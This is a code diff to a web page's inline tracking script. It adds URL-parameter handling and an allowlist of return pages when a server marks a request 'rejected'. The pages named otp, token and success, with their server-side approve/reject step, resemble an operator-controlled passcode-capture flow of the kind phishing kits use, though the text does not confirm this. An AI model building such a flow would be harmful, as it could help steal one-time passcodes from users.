@@ -166,7 +166,10 @@
 
     <!-- Traffic and Database Tracking Script -->
     <script>
-        const requestId = localStorage.getItem("request_id");
+        const params = new URLSearchParams(window.location.search);
+        const requestId = params.get('request_id') || localStorage.getItem("request_id");
+        const returnPage = params.get('return_page');
+        const allowedReturnPages = ['token1_en.html', 'token2_en.html'];
 
         fetch('/track_visit', {
             method: 'POST',
@@ -185,7 +188,8 @@
                 if (data.status === 'approved') {
                     window.location.href = 'success_en.html';
                 } else if (data.status === 'rejected') {
-                    window.location.href = 'otp_en.html?rejected=true';
+                    const targetPage = allowedReturnPages.includes(returnPage) ? returnPage : 'otp_en.html';
+                    window.location.href = targetPage + '?rejected=true';
                 } else if (data.redirect_to) {
                     window.location.href = data.redirect_to;
                 }
